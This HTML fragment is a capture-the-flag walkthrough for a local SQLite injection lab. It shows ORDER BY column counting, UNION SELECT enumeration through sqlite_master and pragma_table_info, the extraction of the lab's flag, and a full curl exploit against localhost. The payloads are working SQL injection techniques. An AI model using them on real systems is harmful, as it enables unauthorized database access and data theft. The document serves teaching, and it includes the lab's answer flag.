<h4>Step 1: Confirm Injection and Column Count</h4>
<p>Verify the injection point and determine the number of columns.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Column Count Check</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' ORDER BY 3 -- -<br>
        <span class="prompt">Result: </span>No error (3 columns confirmed: id, name, department)<br><br>
        <span class="prompt">Input: </span>' ORDER BY 4 -- -<br>
        <span class="prompt">Result: </span><strong>SQLite Error: 1st ORDER BY term out of range - should be between 1 and 3</strong>
    </div>
</div>

<h4>Step 2: Discover Tables via sqlite_master</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Enumerate Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>zzz' UNION SELECT name, type, sql FROM sqlite_master WHERE type='table' -- -<br><br>
        <span class="prompt">Output:</span><br>
        id | name | department<br>
        employees | table | CREATE TABLE employees (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;name TEXT,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;department TEXT<br>
        )<br>
        <strong>hidden_data</strong> | table | CREATE TABLE hidden_data (<br>
        &nbsp;&nbsp;&nbsp;&nbsp;id INTEGER PRIMARY KEY,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;secret_flag TEXT,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;notes TEXT<br>
        )
    </div>
</div>

<h4>Step 3: Enumerate Columns with pragma_table_info()</h4>
<p>
    <code>pragma_table_info('table_name')</code> is a table-valued function unique to SQLite
    that returns column metadata. Much cleaner than parsing CREATE TABLE statements.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Enumerate Columns</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>zzz' UNION SELECT name, type, 'x' FROM pragma_table_info('hidden_data') -- -<br><br>
        <span class="prompt">Output:</span><br>
        id | name | department<br>
        id | INTEGER | x<br>
        notes | TEXT | x<br>
        <strong>secret_flag</strong> | TEXT | x
    </div>
</div>

<h4>Step 4: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>zzz' UNION SELECT id, secret_flag, notes FROM hidden_data -- -<br><br>
        <span class="prompt">Output:</span><br>
        id | name | department<br>
        1 | <strong>FLAG{sq_pr4gm4_t4bl3_1nf0}</strong> | This is the master flag<br>
        2 | not_a_flag | Decoy entry
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_pr4gm4_t4bl3_1nf0}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab2" \<br> --data-urlencode "name=zzz' UNION SELECT id, secret_flag, notes FROM hidden_data -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>pragma_table_info('table_name')</code> is a powerful
    SQLite-specific function for column enumeration. It returns: <code>cid</code>, <code>name</code>,
    <code>type</code>, <code>notnull</code>, <code>dflt_value</code>, <code>pk</code>. Combining
    <code>sqlite_master</code> + <code>pragma_table_info()</code> gives full schema enumeration in SQLite.
</div>
